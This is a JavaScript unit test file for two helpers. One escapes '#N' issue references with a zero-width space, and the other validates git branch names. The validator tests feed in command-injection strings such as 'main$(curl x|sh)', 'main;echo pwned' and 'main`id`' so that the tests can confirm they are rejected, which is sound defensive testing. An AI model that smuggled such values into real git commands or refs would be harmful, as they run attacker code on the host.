import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { validateGitRef, escapeHashReferences } from "./platform.js";

describe("escapeHashReferences", () => {
  it("escapes #N after space", () => {
    assert.equal(escapeHashReferences("see #2 for details"), "see #\u200B2 for details");
  });

  it("escapes #N at line start", () => {
    assert.equal(escapeHashReferences("#1 issue"), "#\u200B1 issue");
  });

  it("escapes #N after opening punctuation", () => {
    assert.equal(escapeHashReferences("(#1) fix"), "(#\u200B1) fix");
    assert.equal(escapeHashReferences("[#3] related"), "[#\u200B3] related");
    assert.equal(escapeHashReferences(">#5 quote"), ">#\u200B5 quote");
  });

  it("escapes #N after colon", () => {
    assert.equal(escapeHashReferences("issue:#1 here"), "issue:#\u200B1 here");
  });

  it("escapes #N after Chinese punctuation", () => {
    assert.equal(escapeHashReferences("阻塞项：#1 修复"), "阻塞项：#\u200B1 修复");
    assert.equal(escapeHashReferences("，#2 another"), "，#\u200B2 another");
    assert.equal(escapeHashReferences("、#1 fix"), "、#\u200B1 fix");
  });

  it("escapes #N followed by punctuation", () => {
    const result = escapeHashReferences("see #1, then #2");
    assert.equal(result, "see #\u200B1, then #\u200B2");
  });

  it("does not escape inside fenced code blocks", () => {
    const text = "review\n```python\nprint(#1)\n```\nsee #2";
    const result = escapeHashReferences(text);
    assert.ok(result.includes("print(#1)"));
    assert.ok(result.includes("#\u200B2"));
  });

  it("does not escape inside inline code", () => {
    const text = "use `#1` to refer, see #2";
    const result = escapeHashReferences(text);
    assert.ok(result.includes("`#1`"));
    assert.ok(result.includes("#\u200B2"));
  });

  it("handles multiple fenced code blocks", () => {
    const text = "see #1\n```\n#2\n```\nthen #3\n```\n#4\n```\nand #5";
    const result = escapeHashReferences(text);
    assert.ok(result.includes("#\u200B1"));
    assert.ok(result.includes("#\u200B3"));
    assert.ok(result.includes("#\u200B5"));
    assert.ok(!result.includes("#\u200B2"));
    assert.ok(!result.includes("#\u200B4"));
  });

  it("does not escape markdown headings", () => {
    assert.equal(escapeHashReferences("## Heading"), "## Heading");
    assert.equal(escapeHashReferences("# heading\ntext"), "# heading\ntext");
  });

  it("does not escape ## followed by space", () => {
    assert.equal(escapeHashReferences("## 42 items"), "## 42 items");
  });

  it("returns empty string unchanged", () => {
    assert.equal(escapeHashReferences(""), "");
  });

  it("returns text without matches unchanged", () => {
    assert.equal(escapeHashReferences("no references here"), "no references here");
  });

  it("escapes multiple #N on same line", () => {
    assert.equal(
      escapeHashReferences("fix #1 and #2 and #3"),
      "fix #\u200B1 and #\u200B2 and #\u200B3",
    );
  });
});

describe("validateGitRef", () => {
  it("accepts valid branch names", () => {
    assert.equal(validateGitRef("main"), "main");
    assert.equal(validateGitRef("feature/my-branch"), "feature/my-branch");
    assert.equal(validateGitRef("release/v1.2.3"), "release/v1.2.3");
    assert.equal(validateGitRef("fix_123"), "fix_123");
  });
  it("rejects branch names with shell metacharacters", () => {
    assert.throws(() => validateGitRef("main$(curl x|sh)"), /Invalid git ref/);
    assert.throws(() => validateGitRef("main;echo pwned"), /Invalid git ref/);
    assert.throws(() => validateGitRef("main`id`"), /Invalid git ref/);
    assert.throws(() => validateGitRef("main$(id)"), /Invalid git ref/);
    assert.throws(() => validateGitRef("main|cat"), /Invalid git ref/);
    assert.throws(() => validateGitRef("main&&echo"), /Invalid git ref/);
    assert.throws(() => validateGitRef("$(echo hi)"), /Invalid git ref/);
  });
  it("rejects empty string", () => {
    assert.throws(() => validateGitRef(""), /Invalid git ref/);
  });
  it("rejects names with spaces", () => {
    assert.throws(() => validateGitRef("my branch"), /Invalid git ref/);
  });
});